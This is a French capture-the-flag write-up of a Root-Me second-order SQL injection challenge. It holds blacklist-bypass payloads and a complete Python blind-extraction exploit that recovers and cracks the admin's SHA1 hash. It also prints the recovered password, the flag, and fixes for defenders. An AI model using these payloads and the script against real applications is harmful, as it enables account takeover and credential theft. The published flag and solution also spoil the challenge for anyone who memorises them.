# Writeup — Root-Me : SQL injection — Second Order (Insert)

> **Objectif** : récupérer le flag d'une petite application PHP de « mailing list ». Il n'y a pas d'injection directe exploitable : il faut une injection SQL de **second ordre**, contourner une blacklist, puis extraire en aveugle le mot de passe de l'admin.
>
> **Flag** : `RM{y3ah!_SqL1_2nd_f0r_tH3_w1N_72a9865ef}` (la fin est propre à chaque instance ; l'exploit l'affiche).

Writeup volontairement détaillé et pédagogique. On part de zéro : on comprend ce qu'est une injection « second ordre », on cartographie le filtre, on construit un oracle, et on automatise l'extraction.

---

## 1. C'est quoi une injection SQL de « second ordre » ?

Une injection SQL **classique (premier ordre)** se produit quand une entrée utilisateur part *directement* dans une requête :

```php
$q = "SELECT * FROM users WHERE user='".$_POST['user']."'";  // injectable tout de suite
```

Une injection de **second ordre** est plus sournoise :

1. L'application **enregistre** proprement une donnée que vous fournissez (elle l'échappe correctement à l'INSERT → **aucune injection à ce moment-là**).
2. Plus tard, elle **relit** cette donnée depuis la base et la **réutilise dans une nouvelle requête**, cette fois **par concaténation non sécurisée**.

La charge « dort » dans la base, puis se déclenche à la seconde utilisation. C'est exactement le scénario ici : on contrôle le **username** choisi à l'inscription, il est stocké correctement, mais il est réinjecté brut dans une requête de la page connectée.

---

## 2. Reconnaissance de l'application

L'appli (PHP 8 / Apache / MySQL) propose :

| Page | Rôle |
|---|---|
| `index.php` | formulaire de **login** (`user`, `password`) → `login.php` |
| `new_user.php` | **inscription** (`username`, `email`, `password`, `re_password`) → `login_create.php` |
| `logged-in.php` | zone connectée : « Welcome back *username* » + formulaire de changement d'email |
| `setup-db.php` | **reset** de la base (pratique pour repartir propre) |

On crée un compte de test, on se connecte, et on observe le bas de `logged-in.php` :

```html
<div align="right"><p>Newsletters sent to: z@z.z</p></div>
```

👉 Cette ligne affiche **notre email**, récupéré par une requête. Les warnings PHP (en cassant volontairement l'entrée) confirment la structure :

```
Warning: Undefined array key "username" in /var/www/html/logged-in.php on line 24
Warning: Trying to access array offset on value of type null in /var/www/html/logged-in.php on line 77
```

La page fait, en substance :

```php
$u = $_SESSION['username'];                                   // valeur stockée à l'inscription
$res = mysqli_query($db, "SELECT email FROM users WHERE username='$u'");  // <-- concaténation !
$row = mysqli_fetch_assoc($res);
echo "Newsletters sent to: ".$row['email'];                   // notre canal de sortie
```

Le **login est paramétré** (on l'a vérifié : `user=admin'#` ne bypasse rien) → la faille n'est pas là. C'est bien le **username stocké**, réutilisé dans le `SELECT email ... WHERE username='...'`, qui est injectable (second ordre), et la **sortie** est la colonne `email` affichée après « Newsletters sent to: ».

---

## 3. La blacklist (et comment la contourner)

À l'inscription, `login_create.php` refuse certaines sous-chaînes (**insensible à la casse**) avec le message `Error Bad Char :( <token>`. En les sondant une par une, on obtient :

| Interdit | Autorisé (utile) |
|---|---|
| **espace** (` `), **`/`**, **`*`** | **TAB** `0x09`, **newline** `0x0a` |
| **`union`**, **`select`** | `or`, **`&&`**, `from`, `where` |
| **`and`** | `mid`, `substr`, `substring`, `ascii`, `length` |
| | `like`, `limit`, `order by`, `group_concat` |
| | `#`, `--`, `'`, `"`, `(`, `)`, `=`, `<`, `>`, **`0x..`** |

Le filtre bloque le trio classique `union`/`select`/`and`, les espaces et les commentaires `/* */`. Mais il **oublie** tout le reste. On contourne donc :

- **Espace interdit** → **tabulation** (`\t`) ou newline : MySQL les traite comme des séparateurs.
- **`AND` interdit** → opérateur **`&&`**.
- **Fin de requête** → commentaire **`#`** (pas besoin d'espace, contrairement à `-- `).
- **Comparer une chaîne** sans quotes → **littéral hexadécimal** `0x61646d696e` = `'admin'`.
- **`union`/`select` interdits** → on ne fera **pas** d'UNION : on exfiltre en **aveugle** (blind), caractère par caractère.

> 💡 On confirme l'injection avec un payload minimal. Username à l'inscription :
> ```
> zz'or(1)#
> ```
> Après connexion, `logged-in.php` exécute `SELECT email FROM users WHERE username='zz'or(1)#'` → `WHERE username='zz' OR 1` → **toutes les lignes**, et la page affiche l'email de la première : `Newsletters sent to: alice@rootme.com`. 🎯

---

## 4. Cartographier la base

La sortie ne donne qu'**une colonne** (`email`), mais `ORDER BY ... LIMIT` fonctionne (avec des tabulations à la place des espaces), ce qui permet d'énumérer.

**Énumérer les emails** (payload username, `i` = offset) :

```
e'or(1)order<TAB>by<TAB>email<TAB>limit<TAB>i,1#
```

On récupère 9 comptes « seed » :

```
admin@rootme.com      alfred@rootme.org     alice@rootme.com
angelina@rootme.com   bob@rootme.com        eric12@rootme.local
kris1992@rootme.com   mirabelle@rootme.com  secure@rootme.local
```

**Trouver les colonnes** : `ORDER BY <colonne>` déclenche une erreur SQL (→ sortie vide / `Error :(`) si la colonne n'existe pas. On teste des noms :

```
t'or(1)order<TAB>by<TAB>COLONNE<TAB>limit<TAB>1#
```

→ colonnes valides : **`id`, `username`, `email`, `password`** (table **`users`**, confirmée par `order by users.email`).

**Les mots de passe sont des hash SHA1.** On s'en assure avec un compte témoin (mot de passe connu, longueur du hash = 40) :

```
n'or(length(users.password)=40)order<TAB>by<TAB>email<TAB>desc<TAB>limit<TAB>1#   -> notre compte
```

**Qui est l'admin ?** On mappe `id → email` :

```
i'or(id=N)#
```

| id | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | **9** |
|---|---|---|---|---|---|---|---|---|---|
| email | alice | angelina | eric12 | secure | kris1992 | alfred | mirabelle | bob | **admin@rootme.com** |

👉 **L'admin = `id = 9`**, username `administrator`.

---

## 5. Deux pièges décisifs

### Piège A — `password` est un mot réservé

MySQL possède une fonction `PASSWORD()`. Écrire `substr(password,1,1)` fait interpréter `password` comme **la fonction**, pas comme la colonne → la requête casse (sortie vide). Alors que `substr(email,1,1)` marche parfaitement.

👉 Solution : **quoter la colonne** avec des backticks : `` mid(`password`,1,1) ``.

### Piège B — le username est limité à **71 caractères**

En mesurant via le reflet « Welcome back *…* », on constate qu'au-delà de **71 caractères** le username est tronqué/rejeté. Nos payloads « complets » (avec `email like '...admin@rootme.com...'` + `order by email limit 1`) **dépassaient cette limite** → tronqués → cassés. D'où des résultats « erratiques » tant qu'on ne l'avait pas compris.

👉 Solution : garder des payloads **courts**, et **isoler l'admin par son `id` (9)** (3 caractères) au lieu d'un long littéral email.

> Note : la colonne `username` est un `CHAR` complété par des espaces — c'est pourquoi le vrai username ressort « `administrator` » suivi de plusieurs espaces.

---

## 6. L'oracle d'extraction en aveugle

On combine tout. Pour tester « le `pos`-ième caractère du hash de l'admin vaut-il `HH` ? », le username à enregistrer est :

```
'or((id=9)&&(mid(`password`,POS,1)=0xHH))#<token>
```

- `id=9` → cible uniquement l'admin (et c'est court) ;
- `&&` → remplace `AND` ;
- `` mid(`password`,POS,1) `` → le caractère voulu du hash ;
- `=0xHH` → comparaison au caractère candidat (en hex) ;
- `#<token>` → commente la fin **et** rend le username unique (l'inscription refuse les doublons).

Longueur ≈ 41 caractères → bien sous la limite de 71. ✅

**Lecture de l'oracle** : après inscription + connexion avec ce username, `logged-in.php` exécute

```sql
SELECT email FROM users WHERE username='' OR ((id=9) && (mid(`password`,POS,1)=0xHH)) #...'
```

- si le caractère correspond → la ligne `id=9` matche → **`Newsletters sent to: admin@rootme.com`** ;
- sinon → aucune ligne → ligne vide.

Le SHA1 ne contient que des caractères `[0-9a-f]` : **16 essais maximum par position**, 40 positions.

---

## 7. L'exploit complet

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Exploit — Root-Me 'Second Order Injection' (Web-Serveur)."""
import argparse, hashlib, random, string, sys, requests

TAB = "\t"          # remplace l'espace (0x20 blackliste)
BT  = "\x60"        # backtick ` pour quoter la colonne reservee `password`
HEX = "0123456789abcdef"   # charset d'un hash SHA1


def rtok(n=5):
    return "".join(random.choices(string.ascii_lowercase, k=n))


def oracle(base, uid, pos, guess_char):
    """True ssi le caractere `pos` (1-indexe) du SHA1 du password de l'utilisateur
    `uid` vaut `guess_char`.  payload < 71 caracteres :
        ' or ((id=UID) && (mid(`password`,POS,1) = 0xHH)) #<token>
    """
    gh = "0x%02x" % ord(guess_char)
    payload = f"'or((id={uid})&&(mid({BT}password{BT},{pos},1)={gh}))#{rtok()}"
    s = requests.Session()
    s.post(f"{base}/login_create.php", data={
        "username": payload, "email": f"z{random.randint(0, 10**9)}@x.com",
        "password": "pw", "re_password": "pw", "submit": "Register"})
    s.post(f"{base}/login.php", data={
        "user": payload, "password": "pw", "submit": "Login"})
    html = s.get(f"{base}/logged-in.php").text
    i = html.find("Newsletters sent to:")
    return i >= 0 and "admin@rootme.com" in html[i:i + 140]


def extract_sha1(base, uid=9, length=40):
    h = ""
    for pos in range(1, length + 1):
        for c in HEX:
            if oracle(base, uid, pos, c):
                h += c; sys.stderr.write(c); sys.stderr.flush(); break
        else:
            break
    sys.stderr.write("\n")
    return h


def crack(sha1_hex, wordlist):
    with open(wordlist, "rb") as f:
        for line in f:
            w = line.rstrip(b"\r\n")
            if hashlib.sha1(w).hexdigest() == sha1_hex:
                return w.decode("latin-1")
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="http://challenge01.root-me.org:PORT")
    ap.add_argument("--id", type=int, default=9, help="id de la cible (admin = 9)")
    ap.add_argument("--user", default="administrator", help="username de la cible")
    ap.add_argument("--wordlist", default="rockyou.txt")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    # 1) Blind-extraction du SHA1
    print("[*] extraction du SHA1 du password admin (blind)...", file=sys.stderr)
    sha1_hex = extract_sha1(base, uid=args.id)
    print(f"[+] SHA1(admin) = {sha1_hex}", file=sys.stderr)

    # 2) Cassage du hash
    pwd = crack(sha1_hex, args.wordlist)
    if not pwd:
        print("[!] non casse ; essayez une autre wordlist.", file=sys.stderr); sys.exit(1)
    print(f"[+] password admin = {pwd}", file=sys.stderr)

    # 3) Login admin -> flag
    s = requests.Session()
    s.post(f"{base}/login.php", data={"user": args.user, "password": pwd, "submit": "Login"})
    html = s.get(f"{base}/logged-in.php").text
    i = html.lower().find("take this flag")
    flag = html[i:i + 120].split(":", 1)[-1].split("<")[0].strip() if i >= 0 else html
    print(flag)


if __name__ == "__main__":
    main()
```

### Déroulé

```console
$ python exploit.py --url http://challenge01.root-me.org:59086 --wordlist rockyou.txt
[*] extraction du SHA1 du password admin (blind)...
fe7cd799716a10337ec50f8a54e1ddfe370cc7ac
[+] SHA1(admin) = fe7cd799716a10337ec50f8a54e1ddfe370cc7ac
[+] password admin = CORONADObillabon
RM{y3ah!_SqL1_2nd_f0r_tH3_w1N_72a9865ef}
```

1. **Extraction aveugle** → SHA1 de l'admin = `fe7cd799716a10337ec50f8a54e1ddfe370cc7ac`.
2. **Cassage** (rockyou) → `SHA1('CORONADObillabon')` correspond. Mot de passe admin = **`CORONADObillabon`**.
3. **Login** `administrator` / `CORONADObillabon` → `logged-in.php` répond :
   ```
   Well done, take this flag: RM{y3ah!_SqL1_2nd_f0r_tH3_w1N_72a9865ef}
   ```

---

## 8. Pourquoi ça marche — le résumé en une image

```
  INSCRIPTION (echappee -> stockee telle quelle)
  username = '  or ((id=9) && (mid(`password`,POS,1)=0xHH)) #
                          │
                          ▼  (plus tard, page connectee)
  SELECT email FROM users WHERE username='<username stocke>'
        = ... WHERE username='' OR ((id=9) && (mid(`password`,POS,1)=0xHH)) #...
                          │
          ┌───────────────┴────────────────┐
     char match                       char != 
          │                                │
          ▼                                ▼
  "Newsletters sent to:          "Newsletters sent to:"
     admin@rootme.com"                 (vide)
          │
          ▼  (40 x <=16 requetes)
  SHA1(admin) -> rockyou -> CORONADObillabon -> login admin -> FLAG
```

---

## 9. Côté défense — comment corriger

1. **Requêtes paramétrées PARTOUT**, y compris pour les données **relues depuis la base**. Le bug vient de la réutilisation du username stocké en concaténation :
   ```php
   $stmt = $db->prepare("SELECT email FROM users WHERE username = ?");
   $stmt->execute([$username]);
   ```
   Une donnée « déjà en base » n'est **pas** une donnée de confiance.
2. **Ne pas compter sur une blacklist** : interdire `union`/`select`/`and`/espace est trivialement contournable (tabulations, `&&`, `#`, hex, blind…). Seul le *prepared statement* règle le problème.
3. **Hacher les mots de passe avec un algorithme lent et salé** (`password_hash()` / bcrypt/argon2), pas un SHA1 nu cassable au dictionnaire.
4. **Messages d'erreur génériques** : les warnings PHP et les `Error :(` différenciés servent d'oracle à l'attaquant.

---

## 10. Ce qu'il faut retenir

- **Second ordre** = la charge dort en base à l'inscription (échappée), puis se déclenche à la **réutilisation** non sécurisée (ici `SELECT email ... WHERE username='<stocké>'`).
- Le **canal de sortie** était inattendu : la ligne « Newsletters sent to: *email* ».
- La **blacklist** se contourne : espace→`\t`, `AND`→`&&`, commentaire `#`, comparaisons en `0x…`, exfiltration **blind** pour éviter `union`/`select`.
- Deux détails « casse-tête » décisifs : la colonne **`password` est un mot réservé** (→ backticks), et le **username est plafonné à 71 caractères** (→ isoler par `id`, payloads courts).
- Dernier maillon classique : **extraire le SHA1 en aveugle**, le **casser** (rockyou), se **connecter en admin**.

**Flag :** `RM{y3ah!_SqL1_2nd_f0r_tH3_w1N_72a9865ef}`
